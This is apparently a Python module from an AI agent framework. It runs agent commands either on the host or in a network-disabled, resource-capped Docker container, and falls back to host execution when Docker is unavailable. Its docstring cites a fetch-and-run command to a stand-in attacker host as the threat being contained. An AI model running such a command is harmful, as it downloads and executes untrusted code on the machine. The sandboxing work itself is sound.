"""Pluggable command runner — host subprocess vs ephemeral Docker container.

Selected once at process start by the KOURAI_SANDBOX env var:

    unset / 'host'        HostRunner    direct asyncio subprocess on the host
    'container'           ContainerRunner   `docker run --rm --network none ...`

The runner is hot-swapped via `set_runner()` for tests. All agent-side callers
go through `kourai_common.subprocess.run_command`, which delegates to the
selected runner — they need zero awareness of which mode is active.

Container mode mounts the worktree at /workspace and runs the command there;
network is disabled by default so a hallucinated `curl evil.com | sh` cannot
phone out. Memory/CPU/PID limits keep a runaway test from melting the host.
If `KOURAI_SANDBOX=container` is set but Docker isn't reachable, we log a
warning and fall back to HostRunner — better to keep the forge working than
crash mid-pipeline.
"""

from __future__ import annotations

import asyncio
import logging
import os
import shutil
from collections.abc import Awaitable, Callable
from pathlib import Path
from typing import Protocol

log = logging.getLogger(__name__)

StatusCallback = Callable[[str], Awaitable[None]]

SANDBOX_IMAGE = os.environ.get("KOURAI_SANDBOX_IMAGE", "kourai-sandbox:latest")
DEFAULT_TIMEOUT_S = int(os.environ.get("KOURAI_SANDBOX_TIMEOUT_S", "300"))
DEFAULT_MEMORY = os.environ.get("KOURAI_SANDBOX_MEMORY", "512m")
DEFAULT_CPUS = os.environ.get("KOURAI_SANDBOX_CPUS", "1")
DEFAULT_PIDS = os.environ.get("KOURAI_SANDBOX_PIDS", "256")


class CommandRunner(Protocol):
    """Async command-execution interface used by all agents."""

    async def run(
        self,
        cmd: list[str],
        cwd: str | None,
        status_callback: StatusCallback | None,
    ) -> tuple[int, str, str]: ...


# ── HostRunner — current behavior, preserved exactly ──────────────────


class HostRunner:
    """Direct asyncio subprocess on the host. Default / dev mode."""

    async def run(
        self,
        cmd: list[str],
        cwd: str | None,
        status_callback: StatusCallback | None,
    ) -> tuple[int, str, str]:
        return await _run_subprocess(cmd, cwd=cwd, status_callback=status_callback)


# ── ContainerRunner — docker run --rm --network none ──────────────────


class ContainerRunner:
    """Run commands inside an ephemeral Docker container.

    The container is built from `docker/sandbox.Dockerfile` (`make sandbox-image`).
    The cwd is bind-mounted at /workspace; the command runs there with no
    network and capped resources. When cwd is None, falls back to HostRunner —
    sandboxing requires a concrete workspace to mount.
    """

    def __init__(
        self,
        image: str = SANDBOX_IMAGE,
        memory: str = DEFAULT_MEMORY,
        cpus: str = DEFAULT_CPUS,
        pids: str = DEFAULT_PIDS,
    ) -> None:
        self.image = image
        self.memory = memory
        self.cpus = cpus
        self.pids = pids
        self._host_fallback = HostRunner()

    async def run(
        self,
        cmd: list[str],
        cwd: str | None,
        status_callback: StatusCallback | None,
    ) -> tuple[int, str, str]:
        if cwd is None:
            log.debug("ContainerRunner: cwd is None, falling back to host execution")
            return await self._host_fallback.run(cmd, cwd, status_callback)

        # Path.resolve is synchronous filesystem stat — fine here since we're
        # only assembling argv for the subprocess that does the real work.
        host_cwd = str(Path(cwd).resolve())  # noqa: ASYNC240
        # Run the container process as the host user so files written into the
        # bind-mounted worktree land with the right ownership. Without this the
        # in-image `forge` user (uid 1000) would PermissionError on dirs owned
        # by the player's account. HOME is redirected because an arbitrary uid
        # has no /etc/passwd entry, which breaks tools that expect a writable $HOME.
        user_args: list[str] = []
        if hasattr(os, "getuid") and hasattr(os, "getgid"):
            user_args = ["--user", f"{os.getuid()}:{os.getgid()}", "-e", "HOME=/tmp"]
        docker_cmd = [
            "docker",
            "run",
            "--rm",
            "--network",
            "none",
            "--memory",
            self.memory,
            "--cpus",
            self.cpus,
            "--pids-limit",
            self.pids,
            *user_args,
            "--workdir",
            "/workspace",
            "-v",
            f"{host_cwd}:/workspace:rw",
            self.image,
            *cmd,
        ]
        # Run docker on the host; the inner cmd ends up in the container at /workspace.
        return await _run_subprocess(docker_cmd, cwd=None, status_callback=status_callback)


# ── Selector + module-level singleton ─────────────────────────────────


_runner: CommandRunner | None = None


def get_runner() -> CommandRunner:
    """Return the active runner, selecting one on first call."""
    global _runner
    if _runner is None:
        _runner = _select_runner()
    return _runner


def set_runner(runner: CommandRunner | None) -> None:
    """Override the active runner. Pass None to reset to env-var selection."""
    global _runner
    _runner = runner


def _select_runner() -> CommandRunner:
    mode = os.environ.get("KOURAI_SANDBOX", "host").strip().lower()
    if mode in ("", "host", "off", "0", "false"):
        return HostRunner()
    if mode in ("container", "docker"):
        if shutil.which("docker") is None:
            log.warning(
                "KOURAI_SANDBOX=container but `docker` not found on PATH; "
                "falling back to HostRunner. Install Docker or unset KOURAI_SANDBOX."
            )
            return HostRunner()
        log.info("Sandbox mode: ContainerRunner (image=%s)", SANDBOX_IMAGE)
        return ContainerRunner()
    log.warning("Unknown KOURAI_SANDBOX value %r; using HostRunner", mode)
    return HostRunner()


# ── Shared subprocess primitive (extracted from old run_command) ──────


async def _run_subprocess(
    cmd: list[str],
    cwd: str | None,
    status_callback: StatusCallback | None,
) -> tuple[int, str, str]:
    """Identical to the legacy run_command body. Both runners share it."""
    cmd_str = " ".join(cmd)
    log.debug("Running: %s", cmd_str)

    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        cwd=cwd,
    )

    if status_callback is None:
        stdout, stderr = await proc.communicate()
        return (
            proc.returncode or 0,
            stdout.decode("utf-8", errors="replace"),
            stderr.decode("utf-8", errors="replace"),
        )

    await status_callback(f"$ {cmd_str}")
    stdout_lines: list[str] = []

    async def _drain_stdout() -> None:
        assert proc.stdout is not None  # noqa: S101
        async for raw in proc.stdout:
            line = raw.decode("utf-8", errors="replace").rstrip()
            stdout_lines.append(line)
            if line.strip():
                await status_callback(line)

    async def _drain_stderr() -> bytes:
        assert proc.stderr is not None  # noqa: S101
        return await proc.stderr.read()

    stderr_bytes, _ = await asyncio.gather(_drain_stderr(), _drain_stdout())
    await proc.wait()

    rc = proc.returncode or 0
    if rc != 0:
        await status_callback(f"exit {rc}")

    return rc, "\n".join(stdout_lines), stderr_bytes.decode("utf-8", errors="replace")
